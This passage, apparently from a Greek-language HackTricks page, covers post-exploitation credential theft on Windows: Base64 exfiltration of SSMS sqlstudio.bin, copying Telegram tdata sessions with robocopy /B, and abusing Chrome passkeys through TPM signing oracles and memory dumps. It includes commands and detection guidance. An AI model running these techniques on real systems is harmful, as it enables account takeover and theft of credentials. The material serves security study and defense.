- Τα διαπιστευτήρια καταγράφονται μόνο όταν πραγματοποιείται σύνδεση (διαδραστική, RDP, υπηρεσίας ή μέσω δικτύου, ανάλογα με το hook).

## Αποθηκευμένα διαπιστευτήρια σύνδεσης SSMS (sqlstudio.bin)

Το SQL Server Management Studio (SSMS) αποθηκεύει πληροφορίες αποθηκευμένων συνδέσεων σε ένα αρχείο `sqlstudio.bin` ανά χρήστη. Εξειδικευμένα εργαλεία εξαγωγής μπορούν να αναλύσουν το αρχείο και να ανακτήσουν αποθηκευμένα διαπιστευτήρια SQL. Σε shells που επιστρέφουν μόνο την έξοδο εντολών, συχνά γίνεται exfiltration του αρχείου με κωδικοποίησή του σε Base64 και εκτύπωσή του στο stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Στην πλευρά του χειριστή, αναδημιουργήστε το αρχείο και εκτελέστε το dumper τοπικά για να ανακτήσετε διαπιστευτήρια:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Κλοπή συνεδρίας browser και cookies μέσω Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Κλοπή συνεδρίας `tdata` του Telegram Desktop

Το Telegram Desktop διατηρεί τα δεδομένα εξουσιοδότησης και κατάστασης λογαριασμού στον κατάλογο **`tdata`**. Μια αντιγραμμένη συνεδρία μπορεί να φορτωθεί με συμβατά εργαλεία για πιστοποίηση χωρίς τον κωδικό πρόσβασης του λογαριασμού, όσο η εξουσιοδότηση παραμένει έγκυρη· αν είναι ενεργοποιημένη η κρυπτογράφηση τοπικών δεδομένων, το εργαλείο κλοπής χρειάζεται επίσης τον κωδικό πρόσβασης. Μια πιστοποιημένη συνεδρία μπορεί έπειτα να αποκαλύψει δεδομένα ταυτότητας, μεταδεδομένα διαλόγων και συμμετοχών, μηνύματα και μέσα προς λήψη.<sup>[[10]](#references)</sup>

### Εντοπισμός και απόκτηση

Αναζητήστε τόσο τις εγκατεστημένες όσο και τις φορητές διατάξεις· τα ονόματα των πακέτων Microsoft Store ποικίλλουν, επομένως απαριθμήστε τους καταλόγους πακέτων που περιέχουν το `TelegramMessenge` και εξετάστε το υποδέντρο `LocalCache\Roaming` τους.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Αν οι συνηθισμένες αναγνώσεις αποτύχουν και το token της διεργασίας **περιέχει ήδη και έχει ενεργοποιημένο** το `SeBackupPrivilege`, η πρόσβαση με επίγνωση λειτουργιών δημιουργίας αντιγράφων ασφαλείας παρέχει εναλλακτική λύση· δεν αποκτά το προνόμιο ούτε αυξάνει τα δικαιώματα της διεργασίας. Η `CreateFileW` με `FILE_FLAG_BACKUP_SEMANTICS` μπορεί να ζητήσει σημασιολογία δημιουργίας/επαναφοράς αντιγράφων ασφαλείας και να παρακάμψει τους ελέγχους ασφαλείας αρχείων όταν υπάρχουν τα απαιτούμενα προνόμια στο token, αλλά η σημαία από μόνη της δεν παρακάμπτει μια ασύμβατη κλειδαριά κοινής χρήσης.<sup>[[10]](#references)[[11]](#references)</sup>

Για ενεργά αρχεία που είναι κλειδωμένα, δημιουργήστε/διαβάστε ένα **Volume Shadow Copy**· για αρχεία στα οποία εμποδίζει την πρόσβαση το ACL, το `robocopy /B` χρησιμοποιεί λειτουργία αντιγράφων ασφαλείας και παρακάμπτει τα ACL αρχείων και καταλόγων.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ένα implant που λαμβάνει υπόψη το εύρος ζώνης μπορεί αρχικά να υποβάλει μόνο το ευρετήριο διαδρομών αρχείων, να λάβει ένα αναγνωριστικό snapshot μαζί με τις διαδρομές που έχει ήδη αποθηκεύσει το C2 και να ανεβάσει μόνο τα αρχεία που λείπουν. Επομένως, μικρές σταδιακές μεταφορές μετά από αναδρομική απαρίθμηση του `tdata` μπορούν και πάλι να υποδηλώνουν επιτυχή κλοπή session.<sup>[[10]](#references)</sup>

### Εντοπισμός και περιορισμός

Συσχετίστε την αναδρομική πρόσβαση στο `tdata` από διεργασία εκτός Telegram με ενεργοποίηση του `SeBackupPrivilege`, ανοίγματα αρχείων με backup semantics, δραστηριότητα VSS ή θυγατρική διεργασία `robocopy.exe` που χρησιμοποιεί το `/B`. Αναζητήστε επίσης ταχεία απαρίθμηση τόσο του `%APPDATA%` όσο και του `%LOCALAPPDATA%\Packages`, ακολουθούμενη από εξερχόμενες συνδέσεις από την ίδια διεργασία. Μετά την παραβίαση, χρησιμοποιήστε τις επιλογές **Settings → Devices** (ή **Privacy & Security → Active Sessions**) για να τερματίσετε μη αναγνωρισμένα sessions· η ενεργοποίηση της επαλήθευσης σε δύο βήματα από μόνη της δεν ανακαλεί μια εξουσιοδότηση που έχει ήδη κλαπεί.<sup>[[10]](#references)[[13]](#references)</sup>

## Κλοπή διαπιστευτηρίων Passkeys / WebAuthn από το Chrome στα Windows

Αν αποκτηθεί εκτέλεση κώδικα ως **χρήστης-θύμα** σε host Windows που χρησιμοποιεί **Chrome + συγχρονισμένα passkeys του Google Password Manager**, τα passkeys γίνονται ενδιαφέρον στόχος post-exploitation, ακόμη και **χωρίς admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Ενδιαφέροντα τοπικά artifacts

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** αποθηκεύει εγγραφές **`WebauthnCredentialSpecifics`** κωδικοποιημένες με protobuf. Μια διεργασία του ίδιου χρήστη μπορεί να απαριθμήσει το **RP ID**, το **username**, το **credential ID** και το κρυπτογραφημένο υλικό ιδιωτικού κλειδιού για συγχρονισμένα passkeys.<sup>[[5]](#references)</sup>
- Το **`passkey_enclave_state`** αποθηκεύει την κατάσταση εγγραφής τοπικής συσκευής, όπως το **`wrapped_identity_private_key`** και το wrapped secret που χρησιμοποιείται για την ανάκτηση συγχρονισμένων διαπιστευτηρίων.<sup>[[4]](#references)</sup>

Γρήγορη αρχική αξιολόγηση:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Τα key blobs που είναι δεσμευμένα στο TPM μπορούν και πάλι να χρησιμοποιηθούν ως τοπικό signing oracle

Αν το browser εξαγάγει ένα key ταυτότητας που υποστηρίζεται από TPM ως **`NCRYPT_OPAQUE_KEY_BLOB`** και αποθηκεύσει αυτό το blob σε κατάσταση προσβάσιμη από τον χρήστη, το malware **δεν** χρειάζεται να εξαγάγει το ακατέργαστο ιδιωτικό κλειδί. Μπορεί απλώς να εισαγάγει ξανά το blob στο **ίδιο μηχάνημα** και να ζητήσει από το τοπικό TPM να υπογράψει δεδομένα που ελέγχει ο εισβολέας:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Αυτό σημαίνει ότι η **δέσμευση στο hardware αποτρέπει την εξαγωγή εκτός συσκευής, αλλά όχι τη χρήση από τον ίδιο χρήστη στο παραβιασμένο endpoint**.

### Πρακτικοί τρόποι κατάχρησης

1. **Pass-ta-key / αναμετάδοση ταυτότητας συσκευής**<sup>[[4]](#references)</sup>
   - Απαρίθμηση των `WebauthnCredentialSpecifics` από το LevelDB του Chrome.
   - Εκκίνηση σύνδεσης με passkey και λήψη ενός νέου WebAuthn challenge.
   - Χρήση του κλεμμένου blob `wrapped_identity_private_key` στο TPM του θύματος για υπογραφή του binding του αιτήματος cloud-authenticator.
   - Αναμετάδοση του assertion που επιστρέφεται στο relying party.
   - Αυτό είναι ιδιαίτερα χρήσιμο όταν το RP δέχεται `userVerification=preferred` ή δεν απορρίπτει assertions με **`UV=0`**.
2. **Υφαρπαγή εκκρεμούς UV-key**<sup>[[4]](#references)</sup>
   - Εξαναγκασμός σε εκ νέου onboarding με διαγραφή του `passkey_enclave_state` ή αποστολή έγκυρης, υπογεγραμμένης ενέργειας `device/forget`.
   - Αν το onboarding αφήσει τη συσκευή σε κατάσταση **`uv_key_pending`**, καταχώριση ενός δημόσιου UV key που ελέγχει ο επιτιθέμενος.
   - Αν ο πάροχος δεν επαληθεύει το attestation / την προέλευση από secure hardware για το νέο UV key, οι μεταγενέστερες υπογραφές από το key του επιτιθέμενου θεωρούνται **`UV=1`**.
3. **Κλοπή master secret / ανάκτησης SDS**<sup>[[4]](#references)</sup>
   - Εξαναγκασμός σε ανάκτηση ή επανένταξη, ώστε το Chrome να ανακτήσει το master secret των συγχρονισμένων passkey.
   - Παρακολούθηση της αναδημιουργίας/τροποποίησης του `passkey_enclave_state` και, στη συνέχεια, dump της μνήμης του Chrome όσο το plaintext **security domain secret (SDS)** παραμένει στη μνήμη.
   - Χρήση του SDS που ανακτήθηκε για αποκρυπτογράφηση των κρυπτογραφημένων πεδίων σε κάθε εγγραφή `WebauthnCredentialSpecifics` και ανάκτηση φορητών ιδιωτικών WebAuthn key.

### Ιδέες για DFIR / ανίχνευση

- Παρακολούθηση της **διαγραφής/αναδημιουργίας** του `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Ειδοποίηση για μη φυσιολογική πρόσβαση στο Chrome **`Sync Data\LevelDB`** από διεργασίες που δεν είναι browser.
- Ειδοποίηση για **dump μνήμης του Chrome** ή ύποπτη πρόσβαση στη μνήμη μεταξύ διεργασιών.
- Διερεύνηση επαναλαμβανόμενων προτροπών για **Google Password Manager recovery PIN** ή απροσδόκητου onboarding από την αρχή.
- Να θυμάστε ότι το WebAuthn **`signCount`** συχνά δεν είναι χρήσιμο για συγχρονισμένα passkey, επειδή μπορεί να παραμένει σταθερό, οπότε η κλασική ανίχνευση κλώνων είναι αδύναμη.

## References

- [1] [Unit 42 – Διερεύνηση επιχειρήσεων που στόχευαν επί χρόνια τομείς υψηλής αξίας χωρίς να εντοπιστούν](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing μέσω μακροεντολής Word VBA και SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 σε SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Μέσα στο Ink Dragon: αποκάλυψη του δικτύου relay και της εσωτερικής λειτουργίας μιας μυστικής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: μια νέα επιφάνεια επίθεσης στον έλεγχο ταυτότητας χωρίς κωδικό πρόσβασης](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / αποθήκευση κλειδιών CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Πώς λειτουργεί πραγματικά το Data Store του Active Directory: μέσα στο NTDS.dit (Μέρος 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Απομακρυσμένο dump κωδικών πρόσβασης από το LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Το Armored Likho διευρύνει το οπλοστάσιο κυβερνοκατασκοπείας του με το toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Συνάρτηση CreateFileW και `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Λειτουργία δημιουργίας αντιγράφων ασφαλείας Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Συχνές ερωτήσεις Telegram – τερματισμός ενεργών συνεδριών](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard και Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Προστασία και διαχείριση διαπιστευτηρίων](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
